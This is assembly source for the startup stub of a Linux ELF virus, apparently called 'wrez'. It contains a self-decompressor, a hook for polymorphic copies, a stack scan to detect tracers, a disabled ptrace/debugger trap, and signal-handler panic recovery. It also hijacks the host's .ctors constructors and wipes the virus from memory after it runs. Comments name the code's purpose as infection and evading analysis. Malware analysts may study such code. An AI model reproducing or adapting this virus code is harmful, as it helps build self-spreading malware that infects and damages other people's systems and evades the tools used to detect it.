
	GLOBAL	wrez_init
	GLOBAL	wrcfg
	GLOBAL	decompressor_start
	GLOBAL	decompressor_end
	GLOBAL	data_start

	EXTERN	wrez_main
	EXTERN	wrez_end


pusha_size	equ	32

%include "wrezdefs.inc"

wrez_init:
;	pushf		; XXX: activate only without polymorphism
;	pusha

	; XXX: this is a workaround to test whether to polymorphism
	;      engine worked properly. in wrcore.c we use a special
	;      instruction block (4* 0x90, nop) after the call to
	;      test whether it worked.
; DISABLED FOR NOW
;	mov	ebx, [esp + 0x20 + 4]
;	mov	edx, [ebx]		; instruction at retaddr
;	cmp	edx, 0x90909090
;	jne	dostub
;	popa
;	popf
;	mov	eax, 0x60504030
;	ret



	; XXX: align so that we do not overwrite parts of the wrcfg
	;      structure on final exit.
;	times ((16) - $ + wrez_init) db 0x90

dostub:	call	decompressor_start

wrcfg:

wr_start:
	dd	wrez_init	; wr_start
decomp_len:
	dd	-1

wr_oldctors:
	dd	0x41414141
elf_base:
	dd	0x42424242

victim:	db	'/tmp/v'
	times ((32+4) - $ + victim) db 0x0

; decompress_to = wr_start + cmprlen + (decompressor_end - wrez_init)
cmprlen:	dd	0x41414141
llstuff:	db	0x40
hl1stuff:	dw	0x41
hl2stuff:	db	0x42
hf2stuff:	db	0x43

; ======================= real code start =========================

decompressor_start:
	; get wrcfg structure
	pop	ebp
	push	ebp

	; XXX: this code is needed for polymorphic instantiations and
	;      shellcode-like invocations. in either case, we cannot expect
	;      to have the proper address already there.
	mov	edi, ebp
	sub	edi, (wrcfg - wrez_init)	; virtual address of wrez_init
	mov	[ebp + (wr_start - wrcfg)], edi

	; decompress_to = wr_start + cmprlen + (decompressor_end - wrez_init)
	mov	edi, [ebp + (wr_start - wrcfg)]		; wr_start
	add	edi, (decompressor_end - wrez_init)
	mov	esi, edi				; esi = compressed
	add	edi, [ebp + (cmprlen - wrcfg)]		; + cmprlen

	push	edi		; push edi for the final ret
	push	dword [ebp + (hf2stuff - wrcfg)]
	push	dword [ebp + (hl2stuff - wrcfg)]
	push	dword [ebp + (hl1stuff - wrcfg)]
	push	dword [ebp + (llstuff - wrcfg)]
	pusha

	xor	ebx, ebx
	xor	ecx, ecx
	xor	ebp, ebp
	xor	eax, eax
	cdq

	; esi = compressed data
	; edi = target buffer

main_loop:
eoff:	cmp	esi, [esp + pusha_size + 4 * 4]	; eof ?
	jb	noquit			; Yepp -> Return to 100h

	popa
	add	esp, 4 * 4
	ret		; return to target buffer

noquit:	call	get_bit			; Compressed/uncompressed data next?
	jc	compressed


	; Handle uncompressed data
	mov	cl, 8			; Uncompressed -> Get next 8 bits
	cdq				; No fix-ups (clear edx)

	call	get_data		; Get byte

	xchg	eax, ebx		; Store the byte
        stosb

	;jmp is 5 bytes long, clc jnc is only 3, we win 2 bytes !
        ;jmp     main_loop               ; Loop
	; TODO: use jump (2 bytes short)
	jmp	main_loop


	; Handle compressed data
compressed:
ll:	mov	dl, byte [esp + pusha_size + 0] ; llstuff, Maximum number of bits in a row

bit_loop:
	call	get_bit			; Loop until CF = 0
	jnc	c_getpos

	inc	ecx			; Increase lenght
	dec	edx			; Max number of bits read?
	jnz	bit_loop		; Nope -> Keep reading

	sub	esp, 4
	call	get_huffman		; Yepp -> Get huffman-coded lenght
	add	esp, 4
	mov	ecx, ebx		; Lenght must be in cx

c_getpos:
	jecxz	lenght_1		; Lenght 1? -> Do something else....

	push	ecx			; Save lengt
	call	get_huffman		; Get huffman-coded position
	pop	ecx			; Restore lenght

c_copy:	push	esi			; Save old source

	mov	esi, edi		; Calculate new source offset
	sub	esi, ebx

	inc	ecx			; Fix lenght
	rep movsb			; Copy duplicate data

	pop	esi			; Restore source offset

	jmp	main_loop

lenght_1:
	mov	cl, 4			; Get 4 bits of data for position
	cdq				; Fix-up value 
	inc	edx			; (dx = 1)

        call    get_data                ; Get data

	jmp	c_copy

; Get one bit of data
; Returns:
;     CF - Value of the bit

gb_next_byte:
	lodsb				; Get one byte
        mov	ah, 1			; Mark the end of data
	xchg	ebp, eax		; Move it to bp

get_bit:
	shr	ebp, 1			; Get bit to CF
	jz	gb_next_byte		; No more bits left in dx?
	ret

; Get huffman-coded number
; Returns:
;     bx - The number

get_huffman:
	mov	cx, word [esp + pusha_size + 4 + 8] ; hl1stuff, Assume 3 bits for the number
	cdq				; Fix-up value
	inc	edx			; (dx = 1)

	call	get_bit			; Get huffman bit
	jnc	get_data		; Was 0 -> Values were correct

	mov	cl, byte [esp + pusha_size + 8 + 8]	; hl2stuff
	mov	dl, byte [esp + pusha_size + 12 + 8]	; hf2stuff


; Get n bits of data
; Input:
;     cx - Number of bits wanted
;     dx - Fix-up value to be added to the result
; Returns:
;     bx - The requested number

get_data:
	xor	ebx, ebx

gd_loop:
	call    get_bit			; Get bit
	rcl     ebx, 1			; Store it
	loop    gd_loop			; Loop
	add     ebx, edx		; Fix the value

	ret

decompressor_end:
data_start:

; ============= everything below this line is compressed ===============

rinit:	; &wrcfg is pushed on stack now

	; find tracer signature on stack
	xor	eax, eax
	mov	ebx, 0x494a4b4c
	mov	ecx, ('cart' ^ 0x494a4b4c)
	mov	esi, esp
	cld

trl0:	lodsb
	xor	al, bl

	cmp	eax, ecx
	jnz	cont0
	jmp	wrez_escape	; escape virus

cont0:
	; increase sliding seed
	; ecx = ecx ^ (a ^ b)
	; a = seed_old
	; b = seed_new = (seed_old << 8) | ((seed_old & 0xff) + 1)
	mov	edx, ebx
	shl	ebx, 8
	mov	bl, bh
	inc	bl
	xor	edx, ebx
	xor	ecx, edx

	shl	eax, 8

	; obfuscated compare with 0xc0000000
	bsf	edx, esi	; edx = 0x1e = 0001.1110b
	ror	edx, 0x5
	jnc	trl0

%if 0
	; ok, most likely there is no [sl]trace running on us
	; now check for gdb or any ptrace-using bugger
	call	pphdlr
	mov	[0xbffffffc], byte 0xff
	int3			; cause SIGTRAP

	call	aphdlr

	cmp	[0xbffffffc], byte 0x00
	jne	wrez_escape

	; infection part
	call	rentry
	jmp	wrez_escape

aphdlr:	push	byte 0x0	; SIG_DFL
	jmp	phdlr

pphdlr:	call	phdlr
	; real SIGTRAP handler
shdlr:	mov	[0xbffffffc], byte 0x00
	ret

phdlr:	pop	ecx
	push	byte 0x05
	pop	ebx		; signum = SIGTRAP
	push	byte 0x30
	pop	eax		; __NR_signal
	int3
	int	0x80		; signal (SIGTRAP, shdlr);
	ret
%endif

	; install SIGSEGV and SIGILL handler
	pop	ebp		; &wrcfg
	call	psigillsegv

; signal handler itself
sigillsegv:
	mov	esi, esp
	and	esi, 0xfffffff0
spl0:	lodsd
	cmp	eax, 'mark'
	jne	spl0

	lodsd			; address of real panic handler
	mov	[esp + 64], eax
	ret


psigillsegv:
	pop	ecx
	push	ecx
	push	byte 4
	pop	ebx		; signum = SIGILL
	push	byte 0x30
	pop	eax		; __NR_signal
	int	0x80		; signal (SIGTRAP, shdlr);

	pop	ecx
	push	byte 11
	pop	ebx
	push	byte 0x30
	pop	eax
	int	0x80

	pusha
	push	esp
	call	ppanic

; when signal is caught, it redirects execution here, so this is the
; panic handler
panic:	mov	esi, esp
	and	esi, 0xfffffff0
pl0:	lodsd
	cmp	eax, 'mark'
	jne	pl0
	lodsd
	lodsd			; old stack pointer
	mov	esp, eax
	popa

	sub	esp, 0x20 + 12	; simulate as if we just return from rentry
	push	ebp
	push	0x0		; simulate return value of 0 of wrez_main
	jmp	wrez_cleanout

ppanic:	push	dword 'mark'

; signal handlers are installed now and the stack looks like this:
; <lower> .... 'mark' addr esp pusha-array .... <higher>
; where addr is the address to continue in case of panic

	push	ebp		; &wrcfg
	call	rentry

	push	eax		; save return value

wrez_cleanout:
	; get rid of installed signal handlers
	push	byte 0x00
	pop	ecx
	push	byte 4
	pop	ebx
	push	byte 0x30
	pop	eax
	int	0x80		; signal (SIGILL, SIG_DFL);
	push	byte 0x00
	pop	ecx
	push	byte 11
	pop	ebx
	push	byte 0x30
	pop	eax
	int	0x80		; signal (SIGSEGV, SIG_DFL);

	pop	eax		; return value of wrez_main

	; escape. either called on panic or when the virus code has been
	; successfully executed destroy virus signature in memory
wrez_escape:
	pop	ebp		; pop wrcfg parameter given to rentry

	; since we survived, lets pop stack guards
	add	esp, 12 + 0x20; 'mark', &panic, saved-esp and pusha array

	mov	ebx, [esp + 0x20 + 4]	; retaddr
	mov	edx, [ebx]		; instruction at retaddr
	and	edx, 0x00000700		; get n: 83 c_n_ fc
	shr	edx, 8 - 2		; >> 8, * 4
	mov	esi, esp
	add	esi, 0x20 - 4
	sub	esi, edx
	mov	edi, [esi]	; old .ctors, exact begin of virus

	; FIXME: make a reliable way of either storing edx or edx +4, depending on
    ;        the code that will be executed just after the ret below. see
	;        wrcore.c:700
	mov	edx, dword [ebp + (wr_oldctors - wrcfg)]
	mov	[esi], edx		; overwrite ctors walk register

	; decide what to do with the virus, based on the return value of
	; wrez_main:
	;    0:	erase virus from memory
	; != 0:	continue without erasing

	or	eax, eax
	jz	do_erase

	; int3
	popa
	popf
	ret

do_erase:
	push	edi		; point to return to with last 'ret'

	; now compute the length to zero off
	mov	ecx, [ebp + (wr_start - wrcfg)]
	sub	ecx, edi		; ecx = length of poly-stub
	add	ecx, wrez_len - 5	; 5 bytes instruction
	add	ecx, [ebp + (cmprlen - wrcfg)]		; + cmprlen

	; store the zero'ing opcodes
	cld
	mov	eax, 0x9d61aaf3
	stosd

	mov	al, 0xc3		; 'ret'
	stosb

	xor	eax, eax	; overwrite with NUL (al = \x00)

	ret

rentry:	align	16,db 0x90	; avoid non-executeable ld-generated alignment

	; wrez_main starts directly at this place

